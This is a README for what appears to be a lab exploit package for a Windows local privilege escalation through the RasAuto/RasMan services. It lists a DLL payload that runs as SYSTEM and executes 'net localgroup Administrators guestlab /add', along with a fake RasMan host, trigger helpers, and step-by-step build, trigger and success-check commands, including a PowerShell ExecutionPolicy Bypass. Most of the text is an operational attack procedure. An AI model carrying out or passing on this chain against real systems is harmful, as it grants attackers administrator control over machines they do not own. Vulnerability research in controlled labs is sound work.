# Guest Path Package

This directory contains the built-in `Guest` trigger path for the RasAuto/RasMan LPE.

The current payload in `pwn.c` does this when the exploit lands:

- loads `pwn.dll` in the SYSTEM `rasauto` process
- runs `net localgroup Administrators guestlab /add`
- writes `group_add.txt`
- writes `system.txt` with `whoami`

## Contents

- `exploit_host2.cpp`: fake RasMan host
- `pwn.c`: DLL payload
- `pwn.pbk`: custom PBK used on the hangup path
- `signal_event.c`: sets `RasAutoDialSharedConnectionEvent`
- `launch_guest.c`: starts a process as low-priv `guestlab`
- `launch_builtin_guest.c`: starts a process as built-in `Guest`
- `list_sessions.c`: WTS session dump helper
- `probe_console_token.c`: checks whether the active console user token is queryable
- `query_shared_connection.c`: shared-connection environment check
- `fix_guest_logon.ps1`: Guest logon-rights repair script
- `build_guest_chain.cmd`: builds all required binaries on the Windows VM
- `check_guest_state.cmd`: checks the exact Guest-console state
- `run_guest_chain.cmd`: runs the built-in `Guest` trigger path

## Intended State

This package is for the **built-in `Guest`** path, not the post-logoff variant and not the `guestlab` interactive-user variant.

Known-good runtime shape:

- built-in `Guest` is the active **console** user
- no admin GUI session is active
- `guestlab` exists and has password `password`
- the lab already has the shared-autodial / ICS / shared-VPN prerequisites in place

## Copy To The VM

Copy the contents of this directory to:

```cmd
C:\Users\Public\Desktop\EXPLOIT
```

The batch files assume that exact path.

## Prepare Built-in Guest On A Fresh VM

From an elevated `cmd.exe` on the VM:

```cmd
net user Guest /active:yes
net user Guest password
net user guestlab password
net localgroup "Remote Desktop Users" Guest /add
```

If Guest logon is denied, run:

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\Public\Desktop\EXPLOIT\fix_guest_logon.ps1
```

Then log in **manually** as built-in `Guest` on the VM console. Do not log in as `asritha` in the GUI first.

## Build

From an elevated `cmd.exe` on the VM:

```cmd
cd C:\Users\Public\Desktop\EXPLOIT
build_guest_chain.cmd
```

## Verify Guest State

Still from the VM:

```cmd
cd C:\Users\Public\Desktop\EXPLOIT
check_guest_state.cmd
```

What you want:

- `quser` shows `guest  console  <id>  Active`
- `list_sessions.exe` shows `station=Console user=ASRITHA-WINDOWS\\Guest`

If the VM is in a bad session state, log off the GUI user and log back in manually as built-in `Guest` on the console.

## Trigger The Exploit

From an elevated `cmd.exe` or SSH admin shell on the VM:

```cmd
cd C:\Users\Public\Desktop\EXPLOIT
run_guest_chain.cmd
```

That script does:

- removes `guestlab` from `Administrators` up front
- kills any old fake RasMan host
- clears old proof files
- stops `RasMan`
- starts `RasAuto`
- starts the fake RasMan host as low-priv `guestlab`
- triggers `RasAutoDialSharedConnectionEvent` as built-in `Guest`
- waits for the SYSTEM cleanup path
- prints the proof files and final `Administrators` membership

## Success Criteria

Successful output should include:

- `squatter.log` contains `SubmitRequestLocal code=101`
- `load.txt` contains `loaded`
- `group_add.txt` shows the `net localgroup Administrators guestlab /add` result
- `system.txt` contains `nt authority\system`
- `net localgroup Administrators` now lists `guestlab`

## Notes

- `run_guest_chain.cmd` is the main entrypoint for the working built-in `Guest` path.
- The current package is intentionally scoped to the built-in `Guest` variant that was previously exercised successfully.
- The post-logoff / no-user `guestlab` scheduled-task path is not included here because it did not reach `ReferenceCustomCount` end to end with the current fake-RasMan behavior.
